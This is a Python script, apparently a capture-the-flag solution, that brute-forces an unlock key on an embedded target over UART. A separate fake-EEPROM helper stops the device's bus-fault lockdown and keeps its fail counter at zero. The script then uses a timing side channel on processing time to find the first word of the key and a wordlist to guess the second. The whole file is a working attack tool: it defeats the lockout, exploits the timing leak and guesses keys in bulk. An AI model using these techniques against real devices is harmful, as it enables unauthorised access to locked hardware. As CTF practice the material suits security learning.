#!/usr/bin/env python3
# Brute force once the helper is acting as the fake EEPROM (fake_eeprom.ino).
# No SCL timing needed: the target no longer bus-faults and the fail counter
# is always 0, so we can hammer guesses over UART.
#
#   Stage 1: find the first name (correct one adds ~30ms -> higher proc_ms).
#   Stage 2: try <first>-<name> until unlocked.

import serial, json, time, sys

TARGET_PORT = "/dev/ttyUSB0"
WORDLIST    = "minions_wordlist.txt"

tgt = serial.Serial(TARGET_PORT, 115200, timeout=2)
time.sleep(0.5)
tgt.reset_input_buffer()

names = [l.strip() for l in open(WORDLIST, encoding="utf-8") if l.strip()]

def attempt(key):
    tgt.reset_input_buffer()
    tgt.write(f"unlock_key {key}\n".encode())
    deadline = time.time() + 3
    while time.time() < deadline:
        line = tgt.readline().decode(errors="ignore").strip()
        if line.startswith("{"):
            try:
                r = json.loads(line)
            except json.JSONDecodeError:
                continue
            if r.get("reason") == "bus_fault_lockdown":
                print("[!] BUS FAULT -- fake EEPROM isn't answering. "
                      "Check SDA/SCL wiring and that fake_eeprom is running.")
                sys.exit(1)
            return r
    return {"status": "timeout"}

# ---- stage 1 ----
print("[*] Stage 1: timing sweep for first name...")
times = {}
for n in names:
    r = attempt(f"{n}-x")
    times[n] = r.get("proc_ms", 0)
    print(f"    {n:12s} proc_ms={times[n]}  {r.get('status')}")

ranked = sorted(times, key=times.get, reverse=True)
print(f"[+] top candidates: {[(n, times[n]) for n in ranked[:5]]}")

# ---- stage 2: try the top few first names, each against all second names ----
print("[*] Stage 2: brute-forcing second name...")
for first in ranked[:3]:
    print(f"    trying first={first}")
    for n in names:
        r = attempt(f"{first}-{n}")
        if r.get("status") == "unlocked":
            print(f"\n[+] UNLOCKED: {first}-{n}")
            print(f"[+] {r}")
            print(f"\nFLAG: {r.get('flag')}")
            sys.exit(0)

print("\n[!] No unlock. Paste stage-1 output and I'll look again.")
